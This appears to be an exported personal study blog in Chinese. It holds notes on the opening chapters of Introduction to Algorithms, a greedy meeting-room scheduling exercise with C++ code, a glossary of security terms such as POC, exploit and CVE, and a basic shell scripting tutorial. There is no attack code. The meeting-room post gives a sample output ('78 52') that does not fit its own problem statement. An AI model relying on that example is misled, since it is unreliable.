<li>给定一个依据部件库的机械设计，其中每个部件可能包含其他部件的实例，<strong>我们需要依次列出这些部件，以使每个部件出现在使用它的任何部件之前</strong>。若该<strong>设计由n个部件组成</strong>，则<strong>存在n!种可能的顺序</strong>，其中n!表示阶乘函数。<br>因为阶乘函数甚至比指数函数增长还快，（除非我们只有几个部件，否则）先生成每种可能的顺序，再验证按该顺序每个部件出现在使用它的部件之前，是不可行的。这个问题是<strong>拓扑排序</strong>的一个实例，第22章将介绍如何有效地求解这个问题。</li>
<li>给定平面上的n个点，我们希望寻找这些点的凸壳。<strong>凸壳就是包含这些点的最小的凸多边形</strong>。直观上，我们可以把每个点看成由从一块木板钉出的一颗钉子来表示。凸壳则由一根拉紧的环绕所有钉子的橡皮筋来表示。如果橡皮筋因绕过某颗钉子而转弯，那么这颗钉子就是凸壳的一个顶点(例子参见图33-6)。<br>n个点的2”个子集中的任何一个都可能是凸壳的顶点集。仅知道哪些点是凸壳的顶点还很不够，因为我们还必须知道它们出现的顺序。所以为求凸壳的顶点，存在许多选择。<strong>第33章将给出两种用于求凸壳的好方法。</strong></li>
</ol>
<p>从上述问题中，<strong>算法问题共有的两个特征</strong>：</p>
<ol>
<li><strong>存在许多候选解</strong>，但绝大多数候选解都没有解决手头的问题。<strong>寻找一个真正的解或一个最好的解</strong>可能是一个很大的挑战。</li>
<li><strong>存在实际应用。</strong>在上面所列的问题中，<strong>最短路径问题</strong>提供了最易懂的例子。一家运输公司(如公路运输或铁路运输公司)对如何在公路或铁路网中找出最短路径，有着经济方面的利益，因为采用的路径越短，其人力和燃料的开销就越低。互联网上的一个路由结点为了快速地发送一条消息可能需要寻找通过网络的最短路径。</li>
</ol>
<p><strong>数据结构</strong>是一种存储和组织数据的方式，旨在便于访问和修改。</p>
<p><strong>技术。</strong>虽然可以把本书当做一本有关算法的“菜谱”来使用，但是也许在某一天你会遇到一个问题，一时无法很快找到一个已有的算法来解决它（例如本书中的许多练习和思考题就是这样的情况）。<br>本书将教你一些<strong>算法设计与分析的技术</strong>，以便你能<strong>自行设计算法、证明其正确性和理解其效率。</strong><br>不同的章介绍算法问题求解的不同方面。有些章处理特定的问题，例如，<strong>第9章</strong>的求中位数和顺序统计量，<strong>第23章</strong>的计算最小生成树，<strong>第26章</strong>的确定网络中的最大流。其他章介绍一些技术，例如<strong>第4章</strong>的分治策略，<strong>第15章</strong>的动态规划，<strong>第17章</strong>的摊还分析。</p>
<p><strong>难题。NP完全问题</strong>中每个问题的复杂度与整个类的复杂度有关联性，假如其中任意一个问题在多项式时间内可解的，则这一类问题都是多项式时间可解。这类问题没有已知的有效算法，但我们可以找到一些<strong>“近似算法”</strong>。</p>
<p><strong>并行性。</strong>为了从多核计算机获得最佳的性能，<strong>设计算法时必须考虑并行性</strong>。第27章给出了<strong>充分利用多核的“多线程”算法</strong>的一个模型。从理论的角度来看，该模型具有一些优点，它形成了几个成功的计算机程序的基础，包括一个国际象棋博弈程序。</p>
<h2 id="1-2-作为一种技术的算法"><a href="#1-2-作为一种技术的算法" class="headerlink" title="1.2 作为一种技术的算法"></a>1.2 作为一种技术的算法</h2><p><strong>有效的算法</strong>可以帮助我们明智地去使<strong>用时间（计算时间）和空间（存储器空间）资源</strong>。</p>
<p><strong>效率。</strong>为<strong>求解相同问题</strong>而设计的<strong>不同算法</strong>在<strong>效率方面</strong>常常有<strong>显著差别</strong>，这些差别可能比<strong>由于硬件和软件造成的差别</strong>要重要得多。</p>
<p>我们应该像计算机硬件一样把<strong>算法看成一种技术</strong>，因为整个系统的性能不但依赖于快速的硬件也依赖于有效的算法。</p>
<p><strong>相对于其他先进技术</strong>，算法也是十分重要的技术。因为所有这些都广泛地使用算法，<strong>算法</strong>是当代计算机中使用的<strong>大多数技术的核心</strong>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这章概述算法这种技术，让读者认识一些<strong>算法概念</strong>，知道算法的地位和<strong>重要性</strong>。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论——第2章</title>
    <url>/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/</url>
    <content><![CDATA[<h1 id="算法导论——第2章-算法基础"><a href="#算法导论——第2章-算法基础" class="headerlink" title="算法导论——第2章 算法基础"></a>算法导论——第2章 算法基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本章将要<strong>介绍一个贯穿本书的框架</strong>，后续的算法设计与分析都是在这个框架中进行的。</p>
<p>这一部分内容基本上是独立的，但也有对第3章和第4章中一些内容的引用（本章也包含几个求和的式子，附录A将给出如何求和）。</p>
<p>首先，我们<strong>考察</strong>求解第1章中引入的排序问题的<strong>插入排序算法</strong>。我们定义一种对于已经编写过计算机程序的读者来说应该熟悉的“<strong>伪代码</strong>”，并用它来<strong>表明我们将如何说明算法</strong>。</p>
<p>然后，在说明了插入排序算法后，我们将<strong>证明该算法能正确地排序并分析其运行时间</strong>。这种分析引入了一种<strong>记号</strong>，该记号关注<strong>时间</strong>如何随着将被排序的项数而增加。</p>
<p>在讨论完插入排序之后，我们<strong>引入</strong>用于<strong>算法设计</strong>的<strong>分治法</strong>并使用这种方法<strong>开发</strong>一个称为<strong>归并排序的算法</strong>。</p>
<p>最后，我们<strong>分析归并排序的运行时间</strong>。</p>
<h2 id="2-1-插入排序"><a href="#2-1-插入排序" class="headerlink" title="2.1 插入排序"></a>2.1 插入排序</h2><p><strong>排序问题</strong>的<strong>问题陈述：</strong></p>
<blockquote>
<p>输入：n个数的一个序列</p>
<p>输出：输入序列的一个递增排序</p>
</blockquote>
<p><strong>插入排序</strong>类似于排序手中的扑克牌，对于少量元素，它是一个有效的算法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//insertion-sort(A):</span></span><br><span class="line"><span class="keyword">for</span> j=<span class="number">2</span> to A.length</span><br><span class="line">    key = A[j]</span><br><span class="line">    <span class="comment">//insert a[j] into the sorted sequence A[1..j-1]</span></span><br><span class="line">    i = j - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i&gt;<span class="number">0</span> <span class="keyword">and</span> A[i]&gt;key</span><br><span class="line">        A[i+<span class="number">1</span>] = A[i]</span><br><span class="line">        i = i<span class="number">-1</span></span><br><span class="line">    A[i+<span class="number">1</span>] = key</span><br></pre></td></tr></table></figure>

<p><strong>插入排序</strong>的<strong>循环不变式</strong>为<code>A[1..j-1]</code>。<strong>循环不变式</strong>主要用来帮助我们理解算法的正确性。需要满足三条性质：</p>
<ol>
<li><strong>初始化</strong>：循环的第一次迭代前，它为真</li>
<li><strong>保持</strong>：如果在循环的某次迭代之前它为真，那么下次迭代之前它仍为真。</li>
<li><strong>终止</strong>：在循环终止时，不变式为我们提供一个有用的性质，该性质帮助证明算法是正确的。</li>
</ol>
<p><strong>伪代码</strong>中的一些<strong>约定</strong>：</p>
<ol>
<li><code>//</code>表示该行后面部分是注释。</li>
<li><code>for X to / downto Y by M</code>表示将X每次递增（to）M或者递减（downto）M到Y</li>
<li>缩进表示块结构</li>
<li>变量若不显式说明，一般为局部变量</li>
<li><code>A[i]</code>表示A数组的第i个元素</li>
</ol>
<h2 id="2-2-分析算法"><a href="#2-2-分析算法" class="headerlink" title="2.2 分析算法"></a>2.2 分析算法</h2><p><strong>分析算法</strong>的结果意味着需要<strong>预测算法所需要的资源</strong>。</p>
<p><strong>插入排序算法的分析。</strong>我们通常把一个程序的<strong>运行时间</strong>描述成其<strong>输入规模的函数</strong>。为此我们需要定义<strong>运行时间</strong>和<strong>输入规模</strong>。</p>
<p><strong>输入规模的最佳概念依赖于研究的问题。</strong>对于研究的每个问题，我们将指出所使用的<strong>输入规模量度</strong>。</p>
<p>一个算法的在特定输入上的<strong>运行时间</strong>是指<strong>执行的基本操作数或步数</strong>。</p>
<p><strong>分析插入排序算法的过程：</strong></p>
<ol>
<li>首先给出<strong>伪代码</strong>中，每条语句的<strong>执行时间</strong>和<strong>执行次数</strong>。<br><img src="/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/image-20210612155737763.png" alt="image-20210612155737763"></li>
<li>将<strong>代价</strong>与<strong>次数</strong>列对应元素之积求和，求得该算法的<strong>运行时间</strong><br><img src="/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/image-20210612170827577.png" alt="image-20210612170827577"></li>
<li><strong>最佳情况</strong>（也就是全都排列好了）的<strong>运行时间</strong>，可以表示为<br>$$<br>a<em>n+b<br>$$<br>它是n的*<em>线性函数。</em></em><br><img src="/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/image-20210612180456773.png" alt="image-20210612180456773"></li>
<li><strong>最差情况</strong>（也就是数组反向排序）的<strong>运行时间</strong>，可以表示为<br>$$<br>a<em>n^2  + b</em>n + c<br>$$<br>它是n的<strong>二次函数。</strong><img src="/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC2%E7%AB%A0/image-20210612192159007.png" alt="image-20210612192159007"> </li>
</ol>
<p><strong>一般情况</strong>下，我们习惯于研究<strong>最差情况</strong>。在某些<strong>特殊的情况</strong>下，我们会对一个算法的<strong>平均情况</strong>运行时间感兴趣。</p>
<p>我们真正感兴趣的是运算时间的<strong>增长率</strong>和<strong>增长量级</strong>。所以我们<strong>只考虑</strong>公式中最重要的项，就是<strong>高阶项</strong>，而<strong>忽略低阶项和常数项</strong>。</p>
<h2 id="2-3-设计算法"><a href="#2-3-设计算法" class="headerlink" title="2.3 设计算法"></a>2.3 设计算法</h2><p>本节我们考查另一种称为“<strong>分治法</strong>”的设计方法。第4章将更深入地探究该方法。</p>
<p>我们将用<strong>分治法</strong>来<strong>设计一个排序算法</strong>，该算法的最坏情况运行时间比插入排序要少得多。</p>
<p><strong>分治算法的优点之一</strong>是，通过使用第4章介绍的技术往往<strong>很容易确定其运行时间</strong>。</p>
<h3 id="2-3-1-分治法"><a href="#2-3-1-分治法" class="headerlink" title="2.3.1 分治法"></a>2.3.1 分治法</h3><p><strong>分治法的思想</strong>：将原问题<strong>分解</strong>成几个规模较小但类似于原问题的子问题。<strong>递归地求解</strong>这些子问题，然后再<strong>合并这些子问题的解</strong>来建立原问题的解。</p>
<p><strong>归并排序</strong>算法完全<strong>遵循分治模式</strong>。直观上其<strong>操作如下</strong>:</p>
<ol>
<li><strong>分解：</strong>分解待排序的n个元素的序列成各具n/2个元素的两个子序列。</li>
<li><strong>解决：</strong>使用归并排序递归地排序两个子序列。</li>
<li><strong>合并：</strong>合并两个已排序的子序列以产生已排序的答案。</li>
</ol>
<p>调用<code>Merge(A,p,q,r)</code>将已排序数组<code>A[p..q]</code>和<code>A[q+1..r]</code><strong>合并</strong>，伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Merge(A, p, q, r)</span></span><br><span class="line">n1 = q - p + <span class="number">1</span>;</span><br><span class="line">n2 = r - q;</span><br><span class="line">Let L[<span class="number">1.</span>.n1+<span class="number">1</span>] <span class="keyword">and</span> R[<span class="number">1.</span>.n2+<span class="number">1</span>] be <span class="keyword">new</span> arrays</span><br><span class="line"><span class="keyword">for</span> i=<span class="number">1</span> to n1</span><br><span class="line">    L[i] = A[p+i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span> j=<span class="number">1</span> to n2</span><br><span class="line">    R[j] = A[q+j];</span><br><span class="line">L[n1+<span class="number">1</span>] = \infity;</span><br><span class="line">R[n2+<span class="number">1</span>] = \infity;</span><br><span class="line">i=<span class="number">1</span>;</span><br><span class="line">j=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> k=p to r</span><br><span class="line">    <span class="keyword">if</span> L[i] &lt;= R[j]</span><br><span class="line">        A[k] = L[i]</span><br><span class="line">        i = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        A[k] = R[j]</span><br><span class="line">        j = j+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><strong>循环不变式</strong>为<code>A[p,k-1]</code>，为了证明算法正确性，它需要满足：</p>
<ol>
<li><strong>初始化：</strong>迭代前<code>k=p</code>时，<code>A[p..k-1]</code>为空。它为真</li>
<li><strong>保持：</strong>因为L和R数组都是已经排序好的数组，所以每次选出来的确实是最小值。如果L[i]&lt;=R[j]，将L[i]复制给A[k]，增加i和k的值后，为下次迭代建立了该循环不变式，反之亦然。</li>
<li><strong>终止：</strong>终止时<code>k=r+1</code>，<code>A[p..k-1]</code>就是<code>A[p..r]</code>且按照从小到大的顺序包含L和R数组除了哨兵之外的所有元素。</li>
</ol>
<p><code>Merge</code>的<strong>运行时间</strong>是：<br>$$<br>\theta(n)<br>$$<br>所以<strong>归并排序</strong>算法的伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//merge-sort(A, p, r)</span></span><br><span class="line"><span class="keyword">if</span> p&lt;r</span><br><span class="line">    q= (p+r)/<span class="number">2</span></span><br><span class="line">    merge-sort(A, p, q)</span><br><span class="line">    merge-sort(A, q+<span class="number">1</span>, r)</span><br><span class="line">    merge(A, p, q, r)</span><br></pre></td></tr></table></figure>

<h3 id="2-3-2-分析分治算法"><a href="#2-3-2-分析分治算法" class="headerlink" title="2.3.2 分析分治算法"></a>2.3.2 分析分治算法</h3><p>当一个算法包含<strong>对其自身的递归调用</strong>时，我们往往可以用<strong>递归方程</strong>或<strong>递归式</strong>来描述其<strong>运行时间</strong>。</p>
<p>该方程根据<strong>在较小输入上的运行时间</strong>来描述在<strong>规模为n的问题上的总运行时间</strong>。</p>
<p>然后我们可以使用数学工具来求解该<strong>递归式</strong>并给出算法性能的界。</p>
<p><strong>分治算法运行时间的递归式</strong>来自<strong>基本模式</strong>的三个步骤，假设T(n)是规模为n的一个问题的运行时间：</p>
<ol>
<li><strong>分解</strong>。将原问题分解成<strong>a个子问题</strong>，每个<strong>子问题的规模</strong>是原问题的<strong>1/b</strong>，a不一定等于b。分解问题**所需的时间为D(n)**。</li>
<li><strong>解决</strong>。对于一个<strong>规模为n/b的子问题</strong>，需要T(n/b)的运行时间，所以需要<strong>aT(n/b)的时间来求解a个子问题</strong>。</li>
<li><strong>合并</strong>。将子问题的解<strong>合并成原问题的解</strong>需要**时间C(n)**。</li>
</ol>
<p>若<strong>问题规模n</strong>小于等于<strong>某个常量c</strong>时，可以<strong>直接求得运行时间</strong>，那么得到<strong>递归式</strong>：<br>$$<br>T(n)=<br>\begin{cases}<br>\theta(1)，&amp; \text{若 }n \leq c \<br>aT(n/b) + D(n) + C(n)，&amp; \text{其他 }<br>\end{cases}<br>$$<br>为了对<strong>归并排序</strong>算法进行<strong>分析</strong>，我们建立<strong>归并排序n个数</strong>的<strong>最坏情况</strong>运行时间T(n)的<strong>递归式</strong>：</p>
<ol>
<li></li>
</ol>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>贪心算法——会场安排问题</title>
    <url>/2021/04/27/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E4%BC%9A%E5%9C%BA%E5%AE%89%E6%8E%92%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="贪心算法——会场安排问题"><a href="#贪心算法——会场安排问题" class="headerlink" title="贪心算法——会场安排问题"></a>贪心算法——会场安排问题</h1><h2 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h2><p>假设要在足够多的会场里安排一批活动，并希望使用尽可能少的会场。</p>
<p>设计一个有效的贪心算法进行安排。</p>
<h2 id="算法设计："><a href="#算法设计：" class="headerlink" title="算法设计："></a>算法设计：</h2><p>对于给定的k个待安排的活动，计算使用最少会场的时间表。</p>
<h2 id="数据输入："><a href="#数据输入：" class="headerlink" title="数据输入："></a>数据输入：</h2><p>由文件<code>input.txt</code>给出输入数据。</p>
<p>第一行有1个正整数k，表示有k个待安排的活动。</p>
<p>接下来的k行中，每行有两个正整数，分别表示k个待安排的活动开始时间和活动结束时间。</p>
<p>时间以0点开始的分钟计。</p>
<h2 id="结果输出："><a href="#结果输出：" class="headerlink" title="结果输出："></a>结果输出：</h2><p>将计算的最小会场数输出到文件<code>output.txt</code>。</p>
<ul>
<li>输入文件示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">input.txt</span><br><span class="line">5</span><br><span class="line">1 23</span><br><span class="line">12 28</span><br><span class="line">25 35</span><br><span class="line">27 80</span><br><span class="line">36 50</span><br></pre></td></tr></table></figure>

<ul>
<li>输出文件示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">output.txt</span><br><span class="line">78 52</span><br></pre></td></tr></table></figure>

<h2 id="算法思路"><a href="#算法思路" class="headerlink" title="算法思路"></a>算法思路</h2><ul>
<li>贪心算法，选择局部最优解</li>
<li>即按开始时间升序排列，再由后一个活动的开始时间大于或等于前一个活动的结束时间作为筛选条件，直到所有的活动都安排完成。</li>
</ul>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std ;</span><br><span class="line"></span><br><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">&quot;input.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">&quot;output.txt&quot;</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k;</span><br><span class="line">	infile &gt;&gt; k;</span><br><span class="line">	<span class="keyword">int</span> start[k], end[k];</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">		infile &gt;&gt; start[i] &gt;&gt; end[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">sort</span>(start, start + k);</span><br><span class="line">	<span class="built_in">sort</span>(end, end + k);</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (start[i] &lt; end[j]) &#123;</span><br><span class="line">			ans++;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	outfile &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机安全相关的概念</title>
    <url>/2021/06/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
    <content><![CDATA[<h1 id="计算机安全相关的概念"><a href="#计算机安全相关的概念" class="headerlink" title="计算机安全相关的概念"></a>计算机安全相关的概念</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本专业相关概念，放在这里方便自己查询</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><em>POC，Proof of Concept</em>，中文意思是“观点证明”。</p>
<p>这个短语会在漏洞报告中使用，漏洞报告中的<em>POC</em>则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><em>EXP，Exploit</em>，中文意思是“漏洞利用”。</p>
<p>意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>
<h2 id="VUL"><a href="#VUL" class="headerlink" title="VUL"></a>VUL</h2><p><em>VUL，Vulnerability</em>的缩写，泛指漏洞。</p>
<h2 id="CVE漏洞编号"><a href="#CVE漏洞编号" class="headerlink" title="CVE漏洞编号"></a>CVE漏洞编号</h2><p><em>CVE</em>的英文全称是<em>“Common Vulnerabilities &amp; Exposures”</em>，翻译为通用漏洞披露，例如CVE-2015-0057、CVE-1999-0001等等。</p>
<p><em>CVE</em>就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</p>
<p>如果在一个漏洞报告中指明的一个漏洞，如果有<em>CVE</em>名称，你就可以快速地在任何其它<em>CVE</em>兼容的数据库中找到相应修补的信息，解决安全问题。</p>
<h2 id="0-DAY漏洞和0-DAY攻击"><a href="#0-DAY漏洞和0-DAY攻击" class="headerlink" title="0 DAY漏洞和0 DAY攻击"></a>0 DAY漏洞和0 DAY攻击</h2><p>在计算机领域中，<em>Zero-day exploit</em>通常是指还没有补丁的安全漏洞，而<em>Zero-day attack</em>则是指利用这种漏洞进行的攻击。</p>
<p>提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。</p>
<p><em>Zero-day exploit</em>的利用程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。</p>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><em>payload</em>，可以理解为一系列信息中最为关键的信息。</p>
<p>对于程序员来说就是在程序中起关键作用的代码。</p>
]]></content>
      <categories>
        <category>security</category>
      </categories>
      <tags>
        <tag>Vulnerabilities</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell 脚本编程</title>
    <url>/2021/12/07/Shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Shell-脚本编程"><a href="#Shell-脚本编程" class="headerlink" title="Shell 脚本编程"></a>Shell 脚本编程</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Shell 运行于 terminal 中，是用户使用 Linux 的桥梁。这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务。</p>
<p>本篇博客用来记录 Shell 脚本的学习。如果过时、错误、新学会的东西，我知道的就会去修改增加。</p>
<p>我写的一些shell脚本地址：<a href="https://github.com/sun-ruijiang/some-shell-scripts">sun-ruijiang/some-shell-scripts: 一些有用的shell脚本 (github.com)</a></p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul>
<li>系统：WSL 1 Ubuntu 20.04</li>
<li>编辑器：VS code</li>
<li>插件：shellman（智能补全） + shellcheck（自动检错） + shell-format（格式化文档），在VS code内部 terminal 执行 Shell script。</li>
</ul>
<h2 id="Shell-的-hello-word"><a href="#Shell-的-hello-word" class="headerlink" title="Shell 的 hello word"></a>Shell 的 hello word</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo &quot;Hello world&quot;</span><br></pre></td></tr></table></figure>

<p><code>#!</code>是一个约定的标记，它告诉系统这个脚本需要什么解释器来执行</p>
<p><code>echo</code>命令用于向窗口输出文本。</p>
<p>如何执行？</p>
<p>一是作为可执行程序去执行，这种方式默认解释器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod +x ./test.sh  <span class="comment"># 使脚本具有执行权限</span></span><br><span class="line">./test.sh           <span class="comment"># 执行脚本</span></span><br></pre></td></tr></table></figure>

<p>二是作为解释器参数执行，这种方式需要制定解释器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/bin/sh test.sh</span><br><span class="line">/bin/php test.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/07/Shell%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B/image-20211207103135839.png" alt="image-20211207103135839"></p>
<h2 id="Shell-基础"><a href="#Shell-基础" class="headerlink" title="Shell 基础"></a>Shell 基础</h2><h3 id="Shell-变量"><a href="#Shell-变量" class="headerlink" title="Shell 变量"></a>Shell 变量</h3><h4 id="定义赋值"><a href="#定义赋值" class="headerlink" title="定义赋值"></a>定义赋值</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 直接赋值</span></span><br><span class="line">variable_name=&quot;example&quot;  # 注意不能有空格</span><br><span class="line"><span class="meta">#</span><span class="bash"> 语句赋值</span></span><br><span class="line">for variable_name in `ls /etc`</span><br><span class="line">for variable_name in $(ls /etc)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 只读变量</span></span><br><span class="line">readonly variable_name</span><br></pre></td></tr></table></figure>

<h4 id="读取元素"><a href="#读取元素" class="headerlink" title="读取元素"></a>读取元素</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $variable_name</span><br><span class="line">echo $&#123;variable_name&#125;   # 推荐加上&#123;&#125;以区分外界</span><br></pre></td></tr></table></figure>

<h4 id="重置变量"><a href="#重置变量" class="headerlink" title="重置变量"></a>重置变量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">unset variable_name    # 不能删除只读变量</span><br></pre></td></tr></table></figure>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><ol>
<li>环境变量，可以在创建他们的 Shell 及其派生出来的任意子进程 Shell 中使用，退出这个 Shell 环境变量就会丢失。如果想要永久保存这些环境变量，可以在用户家目录下的<code>.bashrc</code>（对当前用户生效）或者<code>/etc/profile</code>（对所有用户生效）文件中定义，在用户登录时这些变量会被初始化。</li>
<li>局部变量，仅在当前 Shell 进程中有效，其他 Shell 启动的程序不能访问。</li>
<li>shell 变量，初始化的shell的变量，既有环境变量，又有局部变量。</li>
</ol>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h4 id="拼接字符串"><a href="#拼接字符串" class="headerlink" title="拼接字符串"></a>拼接字符串</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">your_name=&quot;runoob&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用双引号拼接</span></span><br><span class="line">greeting=&quot;hello, $&#123;your_name&#125; !&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用单引号拼接，单引号不会使用Shell变量</span></span><br><span class="line">greeting=&#x27;hello, &#x27;$your_name&#x27; !&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="获取字符串长度"><a href="#获取字符串长度" class="headerlink" title="获取字符串长度"></a>获取字符串长度</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;abcd&quot;</span><br><span class="line">echo $&#123;#string&#125; #输出 4</span><br></pre></td></tr></table></figure>

<h4 id="提取子字符串"><a href="#提取子字符串" class="headerlink" title="提取子字符串"></a>提取子字符串</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo $&#123;string:1:4&#125; # 从字符串第 2 个字符开始截取 4 个字符：unoo</span><br></pre></td></tr></table></figure>

<h4 id="查找子字符串"><a href="#查找子字符串" class="headerlink" title="查找子字符串"></a>查找子字符串</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">string=&quot;runoob is a great site&quot;</span><br><span class="line">echo $(expr index &quot;$string&quot; io)  # 查找字符 i 或 o 的位置(哪个字母先出现就计算哪个)：输出 4。</span><br></pre></td></tr></table></figure>

<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 空格分隔</span></span><br><span class="line">array_name=(value0 value1 value2 value3)</span><br><span class="line"><span class="meta">#</span><span class="bash"> 单独定义</span></span><br><span class="line">array_name[0]=value0</span><br><span class="line">array_name[1]=value1</span><br><span class="line">array_name[n]=valuen</span><br></pre></td></tr></table></figure>

<h4 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">valuen=$&#123;array_name[n]&#125;   </span><br><span class="line">echo $&#123;array_name[@]&#125;     # 使用@符号可以获取数组中的所有元素</span><br></pre></td></tr></table></figure>

<h4 id="获取数组的长度"><a href="#获取数组的长度" class="headerlink" title="获取数组的长度"></a>获取数组的长度</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 取得数组元素的个数</span></span><br><span class="line">length=$&#123;#array_name[@]&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line">length=$&#123;#array_name[*]&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 取得数组单个元素的长度</span></span><br><span class="line">lengthn=$&#123;#array_name[n]&#125;</span><br></pre></td></tr></table></figure>

